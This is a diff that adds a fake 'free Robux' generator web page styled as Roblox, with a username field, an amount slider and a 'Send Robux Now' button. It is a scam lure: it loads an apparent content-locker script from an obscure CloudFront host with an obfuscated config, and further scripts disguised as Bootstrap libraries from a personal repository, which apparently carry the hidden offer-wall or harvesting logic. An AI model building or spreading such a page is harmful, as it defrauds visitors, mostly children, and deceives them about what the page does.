@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Roblox</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/dev20l/rbxs/1.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;400;900&display=swap" rel="stylesheet">
+    <link id="favicon" rel="shortcut icon" href="https://i.imgur.com/1Fmf0aN.jpeg" type="image/png">
+    <script type="text/javascript">
+        var XmkJe_yqG_ScZYRc = { "it": 4379156, "key": "28485" };
+    </script>
+    <script src="https://d2jiwo73gmsmk.cloudfront.net/ee0ff01.js"></script>
+    <style>
+        body {
+            background-color: #9cedc6;
+            font-family: Arial, sans-serif;
+            height: 80vh;
+            background-image: url(https://i.imgur.com/oLk3XsJ.jpeg);
+            background-size: cover;
+            background-position: center;
+        }
+
+        #robux-amount-slider {
+            background: green;
+        }
+
+        #selected-robux-amount {
+            color: green;
+        }
+
+        #audio-button img {
+            width: 40px;
+            height: 40px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body>
+    <center>
+        <div class="container">
+            <div>
+                <img src="https://i.imgur.com/1Fmf0aN.jpeg" class="logo" id="logo-img" alt="Logo">
+            </div>
+
+            <div id="username-section" style="text-align:center;">
+                <input id="text" minlength="3" maxlength="16" placeholder="Enter Username" class="form__input" required>
+            </div>
+
+            <div id="nav-robux-amount" class="textuser" style="display: none;">
+                ROBLOX Username: <h1 class="bold">@victor</h1>
+                <p id="robux-amount-text"></p>
+            </div>
+
+            <div id="box-input">
+                <div style="font-size: 16px; color: #000;">
+                    Selected Robux: <span id="selected-robux-amount">1000</span>
+                    <input type="range" id="robux-amount-slider" min="0" max="20000" step="100" value="1000" style="width: 100%; margin-bottom: 7%;">
+                </div>
+                <button type="button" class="next offer-btn offer-text gradient responsive-width strike-tooltip" onclick="step2()">Next</button>
+            </div>
+
+            <div id="loading-image" style="display: none; text-align: center;">
+                <img src="https://i.ibb.co/5sQj8BX/giphy.webp" alt="Loading" style="width: 150px; height: auto;">
+            </div>
+
+            <div class="text1" id="text1" style="display: none;">
+                <div id="text1-message">
+                    Welcome <span id="user-name-placeholder" style="color: #0066cc;"></span>, click the button below to easily add <span id="robux-amount-placeholder" style="color: #0066cc;"></span> Robux to your account.
+                </div>
+            </div>
+
+            <div class="offers" id="offers" style="display: none;">
+                <div class="offer-wrapper">
+                    <a class="btn offer-btn offer-text gradient responsive-width strike-tooltip" onclick="_Ri()" title="">Send Robux Now</a>
+                    <br>
+                    <p dir="ltr" style="text-align: left; color: black; font-size: 10px;">
+                        <b>&nbsp;Click the button below to listen to the tutorial.</b>
+                    </p>
+                    <div style="margin-top: 20px;">
+                        <audio id="audio-player" src="https://cdn.pixabay.com/audio/2024/12/29/audio_79bcebc840.mp3"></audio>
+                        <button id="audio-button" onclick="toggleAudio()">▶</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </center>
+    <script>
+        let isPlaying = false;
+        const audioPlayer = document.getElementById("audio-player");
+        const audioButton = document.getElementById("audio-button");
+
+        function toggleAudio() {
+            if (isPlaying) {
+                audioPlayer.pause();
+                audioButton.textContent = "▶";
+            } else {
+                audioPlayer.play();
+                audioButton.textContent = "❚❚";
+            }
+            isPlaying = !isPlaying;
+        }
+    </script>
+    <script src="https://cdn.jsdelivr.net/gh/dev20l/ajax-libs-bootstrap-5.3.4/1.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/dev20l/ajax-libs-bootstrap-5.3.4/2.js"></script>
+</body>
+
+</html>
